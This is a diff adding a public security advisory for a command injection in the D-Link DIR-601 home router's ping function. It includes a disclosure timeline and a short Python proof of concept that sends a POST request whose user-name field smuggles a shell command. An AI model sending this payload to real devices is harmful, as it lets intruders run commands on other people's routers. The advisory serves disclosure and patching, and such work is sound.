@@ -1,0 +1,49 @@
+## Advisory Information
+
+Title: DIR-601 Command injection in ping functionality 
+Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink)
+CVE: None
+
+Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, 
+http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061
+
+However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares. The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes. 
+
+## Product Description
+
+DIR601 -- Wireless N150 Home Router. Mainly used by home and small offices.
+
+## Vulnerabilities Summary
+
+Have come across 1 security issue in DIR601 firmware which allows an attacker to exploit command injection in ping functionality. The user needs to be logged in. After that any attacker on wireless LAN or if mgmt interface is exposed on Internet then an internet attacker can execute the attack. Also XSRF can be used to trick administrator to exploit it.
+
+## Details
+
+Command injection in dir-601
+----------------------------------------------------------------------------------------------------------------------
+import socket
+import struct
+
+# CMD_INJECTION_INPINGTEST
+# Just need user to be logged in and nothing else
+
+
+buf = "POST /my_cgi.cgi HTTP/1.0\r\n"
+buf+="HOST: 192.168.1.8\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\nAccept-Encoding:gzip,deflate,sdch\r\nAccept-Language:en-US,en;q=0.8\r\nContent-Length:101\r\n\r\n"
+buf+="request=ping_test&admin3_user_name=admin1;echo admin > /var/passwd1;test&admin4_user_pwd=admin2&user_type=0"+"\r\n\r\n"
+ 
+print "[+] sending buffer size", len(buf)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("IP_ADDRESS", 80))
+s.send(buf)
+----------------------------------------------------------------------------------------------------------------------
+
+## Report Timeline
+
+* April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline.
+* July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor
+* Nov 13, 2015: A public advisory is sent to security mailing lists.
+
+## Credit
+
+This vulnerability was found by Samuel Huntley
